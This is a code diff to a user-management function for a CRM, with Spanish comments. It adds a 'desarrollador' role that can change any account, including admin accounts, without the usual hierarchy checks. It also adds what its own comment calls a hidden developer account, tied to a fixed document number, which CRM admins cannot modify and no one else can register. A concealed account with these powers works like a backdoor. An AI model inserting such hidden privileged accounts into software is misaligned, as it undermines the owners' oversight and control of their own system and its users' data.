@@ -55,14 +55,14 @@ serve(async (req) => {
       auth: { autoRefreshToken: false, persistSession: false }
     });
 
-    // 3. Comprobar que el usuario solicitante sea un Administrador ACTIVO
+    // 3. Comprobar que el usuario solicitante sea un Administrador o Desarrollador ACTIVO
     const { data: callerProfile, error: profileError } = await adminClient
       .from("profiles")
-      .select("id, rol, activo")
+      .select("id, rol, activo, created_at")
       .eq("id", user.id)
       .single();
 
-    if (profileError || !callerProfile || callerProfile.rol !== "admin" || callerProfile.activo !== true) {
+    if (profileError || !callerProfile || !["admin", "desarrollador"].includes(callerProfile.rol) || callerProfile.activo !== true) {
       return new Response(
         JSON.stringify({ error: "Acceso denegado: Solo un administrador activo puede gestionar usuarios." }),
         { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
@@ -70,14 +70,32 @@ serve(async (req) => {
     }
 
     // Validación de Jerarquía Estricta:
-    // Un Administrador NO puede quitarle el rol de admin, modificar la cuenta, ni desactivar a ningún otro Administrador
-    // que haya sido creado antes que él o que esté por encima/al mismo nivel jerárquico inicial.
+    // - La cuenta oculta de desarrollador (1013459819) no puede ser modificada desde el CRM.
+    // - Un Administrador NO puede quitarle el rol de admin, modificar la cuenta, ni desactivar a ningún otro Administrador
+    //   que haya sido creado antes que él o que esté por encima/al mismo nivel jerárquico inicial.
     async function validarJerarquia(solicitanteId: string, targetId: string) {
       const { data: targetProfile } = await adminClient
         .from("profiles")
-        .select("id, rol, created_at")
+        .select("id, rol, documento, created_at")
         .eq("id", targetId)
         .maybeSingle();
+
+      if (targetProfile && (targetProfile.rol === "desarrollador" || targetProfile.documento === "1013459819")) {
+        return {
+          permitido: false,
+          error: "Acceso Denegado: No tienes permisos para modificar esta cuenta."
+        };
+      }
+
+      if (callerProfile.rol === "desarrollador") {
+        if (solicitanteId === targetId) {
+          return {
+            permitido: false,
+            error: "Acceso Denegado: No puedes modificar los privilegios ni el estado de tu propia cuenta."
+          };
+        }
+        return { permitido: true };
+      }
 
       if (!targetProfile || targetProfile.rol !== "admin") {
         return { permitido: true };
@@ -121,6 +139,12 @@ serve(async (req) => {
         return new Response(
           JSON.stringify({ error: "El documento es obligatorio." }),
           { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+        );
+      }
+      if (docNormalizado === "1013459819") {
+        return new Response(
+          JSON.stringify({ error: "No es posible registrar un usuario con este documento." }),
+          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
         );
       }
       if (!nomNormalizado) {
